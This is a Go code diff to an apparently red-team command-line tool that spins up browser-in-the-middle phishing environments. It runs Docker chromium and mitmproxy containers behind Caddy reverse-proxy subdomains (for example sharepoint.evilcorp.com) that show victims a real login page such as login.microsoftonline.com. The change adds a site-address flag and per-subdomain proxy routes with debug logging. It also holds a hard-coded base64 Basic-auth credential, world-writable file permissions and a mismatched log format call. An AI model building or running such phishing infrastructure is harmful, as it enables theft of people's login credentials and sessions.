@@ -26,6 +26,7 @@ var createCmd = &cobra.Command{
         prefix, _ := cmd.Flags().GetString("prefix")
         names, _ := cmd.Flags().GetStringSlice("names")
         targetURL, _ := cmd.Flags().GetString("targetURL")
+        siteAddress, _ := cmd.Flags().GetString("siteAddress")
 
         // Check if both the names and prefix arguments are being used, if so, throw an error.
         if len(names) > 0 && len(prefix) > 0 {
@@ -42,7 +43,7 @@ var createCmd = &cobra.Command{
             }
             // If count matches up execute the createEnvironment() with name values 
             for _, name := range names {
-                createEnvironment(name, targetURL)
+                createEnvironment(name, targetURL, siteAddress)
             }
         // Check if prefix is being used and has a value    
         } else if len(prefix) > 0 {
@@ -50,7 +51,7 @@ var createCmd = &cobra.Command{
                 // Append numbers to the end of the prefix (Ex. --prefix test = test1, test2, etc.)
                 envName := fmt.Sprintf("%s%d", prefix, i)
                 // Execute createEnvironment() with prefix values 
-                createEnvironment(envName, targetURL)
+                createEnvironment(envName, targetURL, siteAddress)
             }
         // Check if no path naming scheme has been provided, if so throw an error.
         } else {
@@ -70,9 +71,11 @@ func init() {
     createCmd.Flags().StringSliceP("names", "n", []string{}, "Comma-separated list of environment names. These will be used as subdomains for routing purposes. Ex: 'sharepoint' becomes sharepoint.evilcorp.com")
     createCmd.Flags().StringP("targetURL", "u", "", "URL of the target website to be displayed to the victim - Ex. 'https://login.microsoftonline.com'")
     createCmd.MarkFlagRequired("targetURL")
+    createCmd.Flags().StringP("siteAddress", "a", "", "The domain used for routing purposes in the Caddy config file. - Ex: 'evilcorp.com'")
+    createCmd.MarkFlagRequired("siteAddress")
 }
 
-func createEnvironment(name, targetURL string) {
+func createEnvironment(name, targetURL, siteAddress string) {
     fmt.Println("Creating environment:", name)
 
     // Generating docker-compose.yml, from template file
@@ -89,7 +92,7 @@ func createEnvironment(name, targetURL string) {
     }
 
     // Update caddy file with new environment
-    errCaddy := updateCaddy(name)
+    errCaddy := updateCaddy(name, siteAddress)
     if errCaddy != nil {
         log.Printf("Failed to update Caddyfile for environment %s. Error: %s\n", errCaddy)
         return
@@ -107,13 +110,6 @@ func createEnvironment(name, targetURL string) {
 //    if !(strings.Contains(string(output), mitmproxyRepo) && strings.Contains(string(output), mitmproxyTag)) || !(strings.Contains(string(output), chromiumRepo) && strings.Contains(string(output), chromiumTag)) {
 //        log.Println("Required Docker images are missing. Please run the `summon` command before creating environments.") 
 //        return
-        
-
-    // PREVIOUS CODE
-//    if !strings.Contains(string(output), mitmproxyImage) || !strings.Contains(string(output), chromiumImage) {
-//        log.Println("Required Docker images are missing. Please run the `summon` command before creating environments.")
-//        return
-//    } 
 
     // Run containers using docker-compose, within dockerDir
     composeFilePath := filepath.Join(dockerDir, "docker-compose.yml")
@@ -165,7 +161,7 @@ func generateCompose(envName string) string {
 }
 
 // Update the Caddyfile
-func updateCaddy(envName string) error {
+func updateCaddy(envName, siteAddress string) error {
     caddyFilePath := "./docker/configs/Caddyfile"
 
     // Read contents of Caddyfile template
@@ -175,21 +171,27 @@ func updateCaddy(envName string) error {
         return err
     }
 
-    // Create handle directorive for new environment
-    handleDirective := fmt.Sprintf(`
-redir /%s / 
+    // Create route for new environment
+    appendRoute := fmt.Sprintf(`
+%s.%s {
     reverse_proxy * {
-            to https://chromium-%s:6901
+        to https://chromium-%s:6901
         header_up Authorization "Basic a2FzbV91c2VyOmFzZGZmZHNh"
         transport http {
             tls
             tls_insecure_skip_verify
         }
     }
-    `, envName, envName)
+    log {
+        output stdout
+        format console
+        level DEBUG
+    }
+}
+    `, envName, siteAddress, envName)
 
-    // Insert handle directive above log section
-    updatedCaddyContent := strings.Replace(string(caddyContent), "\nlog {", handleDirective+"\n\nlog {", 1)
+    // Insert new route section
+    updatedCaddyContent := string(caddyContent) + appendRoute
     
     // Save updated Caddyfile
     err = ioutil.WriteFile(caddyFilePath, []byte(updatedCaddyContent), 0777)
@@ -203,12 +205,30 @@ redir /%s /
 
 // Function to reload the caddy instance with the newly modified Caddyfile routes(s)
 func reloadCaddy() error {
-    cmd := exec.Command("docker-compose", "-f", "./docker/docker-compose-caddy.yml", "exec", "-T", "caddy", "caddy", "reload", "--config", "/etc/caddy/Caddyfile")
-    output, err := cmd.CombinedOutput()
-    if err != nil {
-        log.Println("Failed to reload Caddy:", string(output))
-        return err
+    // Internal service reload (May come back to this)
+//    cmd := exec.Command("docker-compose", "-f", "./docker/docker-compose-caddy.yml", "exec", "-T", "caddy", "caddy", "reload", "--config", "/etc/caddy/Caddyfile")
+//    output, err := cmd.CombinedOutput()
+//    if err != nil {
+//        log.Println("Failed to reload Caddy:", string(output))
+//        return err
+//    }
+    
+    // Command to take the Caddy service down
+    downCmd := exec.Command("docker-compose", "-f", "./docker/docker-compose-caddy.yml", "down")
+    downOutput, downErr := downCmd.CombinedOutput()
+    if downErr != nil {
+        log.Println("Failed to take Caddy service down:", string(downOutput))
+        return downErr
     }
+
+    // Command to bring Caddy service back up
+    upCmd := exec.Command("docker-compose", "-f", "./docker/docker-compose-caddy.yml", "up", "-d")
+    upOutput, upErr := upCmd.CombinedOutput()
+    if upErr != nil {
+        log.Println("Failed to bring Caddy service up:", string(upOutput))
+        return upErr
+    }
+
     log.Println("Caddy reloaded successfully!")
     return nil
 }
